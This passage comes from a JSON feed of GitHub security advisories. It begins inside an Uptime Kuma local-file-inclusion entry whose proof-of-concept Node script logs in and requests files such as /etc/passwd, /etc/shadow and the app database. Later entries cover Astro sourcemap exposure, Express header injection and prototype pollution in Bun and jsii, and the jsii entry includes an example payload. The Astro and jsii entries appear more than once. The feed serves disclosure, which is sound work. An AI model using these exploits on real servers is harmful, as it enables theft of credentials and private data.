{},\n      ignoreTls: true,\n      upsideDown: false,\n      accepted_statuscodes: [\"200-299\"]\n    }, (res) =&gt; {\n      console.log(`Response for file ${filePath}:`, res);\n      resolve();\n    });\n  });\n}\n\n// Main function for connecting and sending the 'add' request\n(async () =&gt; {\n  const socket = io(CONFIG.serverUrl);\n\n  // Handle connection errors\n  socket.on(\"connect_error\", (err) =&gt; {\n    console.error(\"Connection failed:\", err.message);\n  });\n\n  try {\n    // Connecting with credentials\n    await new Promise((resolve, reject) =&gt; {\n      socket.emit(\"login\", {\n        username: CONFIG.credentials.username,\n        password: CONFIG.credentials.password,\n        token: \"\"\n      }, (res) =&gt; {\n        if (res.ok) {\n          console.log(\"Connection successful\");\n          resolve();\n        } else {\n          console.log(res);\n          reject(new Error(\"Connection failed\"));\n        }\n      });\n    });\n\n    // Sending requests for each file using Promise.all to ensure synchronization\n    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));\n\n    // Wait for all requests to be sent\n    await Promise.all([...realBrowserRequests]);\n\n    // Close the socket after all requests have been sent\n    socket.close();\n    console.log(\"Connection closed after all requests.\");\n\n  } catch (error) {\n    console.error(\"Error:\", error.message);\n    socket.close();\n  }\n})();\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>\n<ul>\n<li><code>/etc/passwd</code>: Contains user account information.</li>\n<li><code>/etc/shadow</code>: Contains password hashes.</li>\n<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>\n<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>\n</ul>\n<p>Any <strong>authenticated user</strong> who can submit a URL in \"real-browser\" mode is at risk of exposing sensitive data through screenshots of these files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h\">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875\">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/releases/tag/1.23.16\">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56331\">https://nvd.nist.gov/vuln/detail/CVE-2024-56331</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qgm-m29m-cj2h\">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qgm-m29m-cj2h",
            "title": "[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor",
            "date_modified": "2024-12-20T21:36:57.000Z",
            "date_published": "2024-12-20T15:10:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qgm-m29m-cj2h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability has been identified in the Express response.links&nbsp;function, allowing for arbitrary resource injection in the Link&nbsp;header when unsanitized data is used.</p>\n<p>The issue arises from improper sanitization in <code>Link</code> header values, which can allow a combination of characters like <code>,</code>, <code>;</code>, and <code>&lt;&gt;</code> to preload malicious resources.</p>\n<p>This vulnerability is especially relevant for dynamic parameters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10491\">https://nvd.nist.gov/vuln/detail/CVE-2024-10491</a></li>\n<li><a href=\"https://www.herodevs.com/vulnerability-directory/cve-2024-10491\">https://www.herodevs.com/vulnerability-directory/cve-2024-10491</a></li>\n<li><a href=\"https://github.com/expressjs/express/issues/6222\">https://github.com/expressjs/express/issues/6222</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cm5g-3pgc-8rg4\">https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cm5g-3pgc-8rg4",
            "title": "[express] Express ressource injection",
            "date_modified": "2024-12-19T17:52:11.000Z",
            "date_published": "2024-10-29T18:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cm5g-3pgc-8rg4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A bug in the build process allows any unauthenticated user to read parts of the server source code.</p>\n<h3 id=\"details\">Details</h3>\n<p>During build, along with client assets such as css and font files, the sourcemap files <strong>for the server code</strong> are moved to a publicly-accessible folder.\n<a href=\"https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139\">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></p>\n<p>Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.</p>\n<p>While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in <code>src/pages</code>) are predictably named. For example. the sourcemap file for <code>src/pages/index.astro</code> gets named <code>dist/client/pages/index.astro.mjs.map</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Here is one example of an affected open-source website:\n<a href=\"https://creatorsgarten.org/pages/index.astro.mjs.map\">https://creatorsgarten.org/pages/index.astro.mjs.map</a></p>\n<img src=\"https://github.com/user-attachments/assets/773c5532-87af-42b8-838e-8f5472bf9f68\" height=\"263\" width=\"500\">\n\n<p>The file can be saved and opened using <a href=\"https://evanw.github.io/source-map-visualization/\">https://evanw.github.io/source-map-visualization/</a> to reconstruct the source code.</p>\n<img src=\"https://github.com/user-attachments/assets/7d35d0ca-3a29-4666-be21-cfefe311ac9d\" height=\"271\" width=\"500\">\n\n<p>The above accurately mirrors the source code as seen in the repository: <a href=\"https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro\">https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro</a></p>\n<img src=\"https://github.com/user-attachments/assets/39e77197-8382-4556-a024-c526dacccc1c\" height=\"298\" width=\"500\">\n\n\n<p>The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com (<a href=\"https://github.com/search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code\">search results link</a>):</p>\n<pre><code>path:astro.config.mjs @sentry/astro\n</code></pre>\n<p>This vulnerability is the root cause of <a href=\"https://github.com/withastro/astro/issues/12703\">https://github.com/withastro/astro/issues/12703</a>, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the <code>dist/client</code> (referred to as <code>config.build.client</code> in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains <code>.map</code> files corresponding to the code that runs on the server.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>All <strong>server-output</strong> (SSR) projects on Astro 5 versions <strong>v5.0.3</strong> through <strong>v5.0.6</strong> (inclusive), that have <strong>sourcemaps enabled</strong>, either directly or through an add-on such as <a href=\"https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50\">sentry</a>, are affected. The fix for <strong>server-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.7\">astro@5.0.7</a></strong>.</p>\n<p>Additionally, all <strong>static-output</strong> (SSG) projects built using Astro 4 versions <strong>4.16.17 or older</strong>, or Astro 5 versions <strong>5.0.7 or older</strong>, that have <strong>sourcemaps enabled</strong> are also affected. The fix for <strong>static-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.8\">astro@5.0.8</a></strong>, and backported to Astro v4 in <strong><a href=\"mailto:astro@4.16.18\">astro@4.16.18</a></strong>.</p>\n<p>The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.</p>\n<p>There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .</p>\n<p>There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.</p>\n<ul>\n<li>Network attack vector.</li>\n<li>Low attack complexity.</li>\n<li>No privileges required.</li>\n<li>No interaction required from an authorized user.</li>\n<li>Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed.</li>\n</ul>\n<h3 id=\"remediation\">Remediation</h3>\n<p>The fix for <strong>server-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.7\">astro@5.0.7</a></strong>, and the fix for <strong>static-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.8\">astro@5.0.8</a></strong> and backported to Astro v4 in <strong><a href=\"mailto:astro@4.16.18\">astro@4.16.18</a></strong>. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr\">https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li>\n<li><a href=\"https://github.com/withastro/astro/issues/12703\">https://github.com/withastro/astro/issues/12703</a></li>\n<li><a href=\"https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515\">https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li>\n<li><a href=\"https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5\">https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li>\n<li><a href=\"https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139\">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56159\">https://nvd.nist.gov/vuln/detail/CVE-2024-56159</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50\">https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-49w6-73cw-chjr\">https://github.com/advisories/GHSA-49w6-73cw-chjr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-49w6-73cw-chjr",
            "title": "[astro] Astro's server source code is exposed to the public if sourcemaps are enabled",
            "date_modified": "2024-12-19T21:38:51.000Z",
            "date_published": "2024-12-19T15:12:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-49w6-73cw-chjr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A bug in the build process allows any unauthenticated user to read parts of the server source code.</p>\n<h3 id=\"details\">Details</h3>\n<p>During build, along with client assets such as css and font files, the sourcemap files <strong>for the server code</strong> are moved to a publicly-accessible folder.\n<a href=\"https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139\">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></p>\n<p>Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.</p>\n<p>While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in <code>src/pages</code>) are predictably named. For example. the sourcemap file for <code>src/pages/index.astro</code> gets named <code>dist/client/pages/index.astro.mjs.map</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Here is one example of an affected open-source website:\n<a href=\"https://creatorsgarten.org/pages/index.astro.mjs.map\">https://creatorsgarten.org/pages/index.astro.mjs.map</a></p>\n<img src=\"https://github.com/user-attachments/assets/773c5532-87af-42b8-838e-8f5472bf9f68\" height=\"263\" width=\"500\">\n\n<p>The file can be saved and opened using <a href=\"https://evanw.github.io/source-map-visualization/\">https://evanw.github.io/source-map-visualization/</a> to reconstruct the source code.</p>\n<img src=\"https://github.com/user-attachments/assets/7d35d0ca-3a29-4666-be21-cfefe311ac9d\" height=\"271\" width=\"500\">\n\n<p>The above accurately mirrors the source code as seen in the repository: <a href=\"https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro\">https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro</a></p>\n<img src=\"https://github.com/user-attachments/assets/39e77197-8382-4556-a024-c526dacccc1c\" height=\"298\" width=\"500\">\n\n\n<p>The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com (<a href=\"https://github.com/search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code\">search results link</a>):</p>\n<pre><code>path:astro.config.mjs @sentry/astro\n</code></pre>\n<p>This vulnerability is the root cause of <a href=\"https://github.com/withastro/astro/issues/12703\">https://github.com/withastro/astro/issues/12703</a>, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the <code>dist/client</code> (referred to as <code>config.build.client</code> in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains <code>.map</code> files corresponding to the code that runs on the server.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>All <strong>server-output</strong> (SSR) projects on Astro 5 versions <strong>v5.0.3</strong> through <strong>v5.0.6</strong> (inclusive), that have <strong>sourcemaps enabled</strong>, either directly or through an add-on such as <a href=\"https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50\">sentry</a>, are affected. The fix for <strong>server-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.7\">astro@5.0.7</a></strong>.</p>\n<p>Additionally, all <strong>static-output</strong> (SSG) projects built using Astro 4 versions <strong>4.16.17 or older</strong>, or Astro 5 versions <strong>5.0.7 or older</strong>, that have <strong>sourcemaps enabled</strong> are also affected. The fix for <strong>static-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.8\">astro@5.0.8</a></strong>, and backported to Astro v4 in <strong><a href=\"mailto:astro@4.16.18\">astro@4.16.18</a></strong>.</p>\n<p>The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.</p>\n<p>There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .</p>\n<p>There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.</p>\n<ul>\n<li>Network attack vector.</li>\n<li>Low attack complexity.</li>\n<li>No privileges required.</li>\n<li>No interaction required from an authorized user.</li>\n<li>Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed.</li>\n</ul>\n<h3 id=\"remediation\">Remediation</h3>\n<p>The fix for <strong>server-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.7\">astro@5.0.7</a></strong>, and the fix for <strong>static-output</strong> projects was released in <strong><a href=\"mailto:astro@5.0.8\">astro@5.0.8</a></strong> and backported to Astro v4 in <strong><a href=\"mailto:astro@4.16.18\">astro@4.16.18</a></strong>. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr\">https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li>\n<li><a href=\"https://github.com/withastro/astro/issues/12703\">https://github.com/withastro/astro/issues/12703</a></li>\n<li><a href=\"https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515\">https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li>\n<li><a href=\"https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5\">https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li>\n<li><a href=\"https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139\">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56159\">https://nvd.nist.gov/vuln/detail/CVE-2024-56159</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50\">https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-49w6-73cw-chjr\">https://github.com/advisories/GHSA-49w6-73cw-chjr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-49w6-73cw-chjr",
            "title": "[astro] Astro's server source code is exposed to the public if sourcemaps are enabled",
            "date_modified": "2024-12-19T21:38:51.000Z",
            "date_published": "2024-12-19T15:12:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-49w6-73cw-chjr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package bun before 1.1.30 are vulnerable to Prototype Pollution due to improper input sanitization. An attacker can exploit this vulnerability through Bun's APIs that accept objects.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21548\">https://nvd.nist.gov/vuln/detail/CVE-2024-21548</a></li>\n<li><a href=\"https://github.com/oven-sh/bun/pull/14119\">https://github.com/oven-sh/bun/pull/14119</a></li>\n<li><a href=\"https://github.com/oven-sh/bun/commit/a234e067a5dc7837602df3fb5489e826920cc65a\">https://github.com/oven-sh/bun/commit/a234e067a5dc7837602df3fb5489e826920cc65a</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-BUN-8499549\">https://security.snyk.io/vuln/SNYK-JS-BUN-8499549</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v9mx-4pqq-h232\">https://github.com/advisories/GHSA-v9mx-4pqq-h232</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v9mx-4pqq-h232",
            "title": "[bun] Bun has an Application-level Prototype Pollution vulnerability in the runtime native API for Glo",
            "date_modified": "2024-12-18T16:56:07.000Z",
            "date_published": "2024-12-18T06:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v9mx-4pqq-h232"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.\nWhen loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named \"category\" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named \"category\", even if it shouldn't. </p>\n<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>\n<blockquote>\n<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>\n</blockquote>\n<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-js\">const jsii = require('jsii');\n\n// prints 'undefined'\nconsole.log(JSON.stringify({}.category))\n\n// calling 'configureCategories' with user input\njsii.configureCategories(JSON.parse('{\"__proto__\": \"user-input\"}'))\n\n// from this point onwards, every single object literal in the program\n// will contain the 'category' key, with user controlled value\nconsole.log(JSON.stringify({}.category)) // prints 'user-input'\n\n\n// this can affect the execution of the main program in case it also makes \n// use of an object key called 'category'. for example, if the main programs \n// happens to have code like this:\n\nconst x = {} // some object in the main program (not necessarily empty)\n\nif (x.category) {\n  // this block will always be executed, effectively \n  // changing the behavior of the main program.\n  console.log('Do something')\n} else {\n  console.log('Do something else')\n}\n</code></pre>\n<p>For more information about javascript prototype pollution, see [1].</p>\n<h2 id=\"patches\">Patches</h2>\n<p>A patch is included in versions <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">5.7.3</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">5.6.4</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">5.5.15</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">5.4.46</a></p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>\n<h2 id=\"references\">References</h2>\n<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<p>[1] <a href=\"https://learn.snyk.io/lesson/prototype-pollution/\">https://learn.snyk.io/lesson/prototype-pollution/</a></p>\n<p>[2] <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/issue-reporting</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2",
            "title": "[jsii] Prototype pollution in jsii.configureCategories",
            "date_modified": "2024-12-18T15:50:11.000Z",
            "date_published": "2024-12-18T15:50:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.\nWhen loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named \"category\" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named \"category\", even if it shouldn't. </p>\n<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>\n<blockquote>\n<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>\n</blockquote>\n<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-js\">const jsii = require('jsii');\n\n// prints 'undefined'\nconsole.log(JSON.stringify({}.category))\n\n// calling 'configureCategories' with user input\njsii.configureCategories(JSON.parse('{\"__proto__\": \"user-input\"}'))\n\n// from this point onwards, every single object literal in the program\n// will contain the 'category' key, with user controlled value\nconsole.log(JSON.stringify({}.category)) // prints 'user-input'\n\n\n// this can affect the execution of the main program in case it also makes \n// use of an object key called 'category'. for example, if the main programs \n// happens to have code like this:\n\nconst x = {} // some object in the main program (not necessarily empty)\n\nif (x.category) {\n  // this block will always be executed, effectively \n  // changing the behavior of the main program.\n  console.log('Do something')\n} else {\n  console.log('Do something else')\n}\n</code></pre>\n<p>For more information about javascript prototype pollution, see [1].</p>\n<h2 id=\"patches\">Patches</h2>\n<p>A patch is included in versions <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">5.7.3</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">5.6.4</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">5.5.15</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">5.4.46</a></p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>\n<h2 id=\"references\">References</h2>\n<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<p>[1] <a href=\"https://learn.snyk.io/lesson/prototype-pollution/\">https://learn.snyk.io/lesson/prototype-pollution/</a></p>\n<p>[2] <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">https://aws.amazon.com/security/issue-reporting</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>\n<li><a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m56h-5xx3-2jc2\">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2",
            "title": "[jsii] Prototype pollution in jsii.configureCategories",
            "date_modified": "2024-12-18T15:50:11.000Z",
            "date_published": "2024-12-18T15:50:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m56h-5xx3-2jc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.\nWhen loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named \"category\" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named \"category\", even if it shouldn't. </p>\n<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>\n<blockquote>\n<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>\n</blockquote>\n<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-js\">const jsii = require('jsii');\n\n// prints 'undefined'\nconsole.log(JSON.stringify({}.category))\n\n// calling 'configureCategories' with user input\njsii.configureCategories(JSON.parse('{\"__proto__\": \"user-input\"}'))\n\n// from this point onwards, every single object literal in the program\n// will contain the 'category' key, with user controlled value\nconsole.log(JSON.stringify({}.category)) // prints 'user-input'\n\n\n// this can affect the execution of the main program in case it also makes \n// use of an object key called 'category'. for example, if the main programs \n// happens to have code like this:\n\nconst x = {} // some object in the main program (not necessarily empty)\n\nif (x.category) {\n  // this block will always be executed, effectively \n  // changing the behavior of the main program.\n  console.log('Do something')\n} else {\n  console.log('Do something else')\n}\n</code></pre>\n<p>For more information about javascript prototype pollution, see [1].</p>\n<h2 id=\"patches\">Patches</h2>\n<p>A patch is included in versions <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.7.3\">5.7.3</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.6.4\">5.6.4</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.5.15\">5.5.15</a>, <a href=\"https://github.com/aws/jsii-compiler/releases/tag/v5.4.46\">5.4.46</a></p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>\n<h2 id=\"references\">References</h2>\n<p>If you have any questions or comments about this advisory, we ask that you contact 